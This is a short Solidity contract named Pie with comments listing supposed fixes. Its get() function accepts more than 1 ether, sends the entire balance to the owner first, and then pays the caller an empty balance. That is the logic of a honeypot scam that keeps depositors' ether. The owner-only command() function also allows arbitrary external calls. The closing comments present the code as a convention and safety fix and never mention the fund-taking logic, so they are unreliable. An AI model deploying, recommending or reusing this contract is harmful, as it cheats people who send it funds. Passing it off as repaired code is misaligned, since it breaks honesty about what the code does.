pragma solidity ^0.4.19;

contract Pie {
    address public owner = msg.sender;

    function() public payable {}

    function get() public payable {
        if (msg.value > 1 ether) {
            owner.transfer(this.balance);
            msg.sender.transfer(this.balance);
        }
    }

    function withdraw() public payable {
        require(msg.sender == owner);
        owner.transfer(this.balance);
    }

    function command(address adr, bytes data) public payable {
        require(msg.sender == owner);
        require(adr.call.value(msg.value)(data));
    }
}

// Changes Made:
// - Changed the variable name from Owner to owner to follow Solidity naming conventions.
// - Removed the unnecessary check for a specific address in the withdraw function.
// - Added a require statement to check the return value of the external call in the Command function to prevent unchecked low-level calls vulnerability.